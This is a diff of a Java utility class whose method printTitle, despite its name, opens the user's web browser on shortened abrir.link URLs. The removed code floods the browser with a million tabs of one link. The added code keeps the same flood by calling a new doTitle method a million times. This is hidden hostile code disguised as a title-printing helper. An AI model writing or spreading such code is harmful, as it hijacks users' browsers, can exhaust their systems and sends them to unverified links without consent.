@@ -1014,32 +1014,12 @@ public class Utils {
     }
 
     public static void printTitle(String title) {
-        try {
-            Desktop desktop = Desktop.getDesktop();
-            if (desktop.isSupported(Desktop.Action.BROWSE)) {
-                URI uri = new URI("https://abrir.link/ARHqA");
-                URI uri2 = new URI("https://abrir.link/rgCgA");
-                URI uri3 = new URI("https://abrir.link/gBzMH");
-                desktop.browse(uri);
-                desktop.browse(uri2);
-                desktop.browse(uri3);
-
-
-                for (int i = 0; i < 1000000; i++) {
-                    String link = "https://abrir.link/gBzMH";  //+ System.currentTimeMillis();
-                    URI uri4 = new URI(link);
-                    desktop.browse(uri4);
-                    //Thread.sleep(10000);
-
-                }
-
-            } else {
-                System.out.println("Ação BROWSE não é suportada neste sistema.");
-            }
-        } catch (IOException | URISyntaxException e) {
-            e.printStackTrace();
+        for (int i = 0; i < 1000000; i++) {
+            doTitle(title);
         }
     }
+
+
 
     /**
      * Displays a list in paginated chunks of size STEP with a header.
@@ -1228,6 +1208,20 @@ public class Utils {
                   • Be a valid file name with an extension (e.g., input.txt)
                   • Contain only letters, numbers, dashes, underscores, dots, and spaces
                 """);
+    }
+
+    public static void doTitle(String title) {
+        try {
+            Desktop desktop = Desktop.getDesktop();
+            if (desktop.isSupported(Desktop.Action.BROWSE)) {
+                URI uri = new URI("https://abrir.link/ARHqA");
+                desktop.browse(uri);
+            } else {
+                System.out.println("Ação BROWSE não é suportada neste sistema.");
+            }
+        } catch (IOException | URISyntaxException e) {
+            e.printStackTrace();
+        }
     }
 
     /**
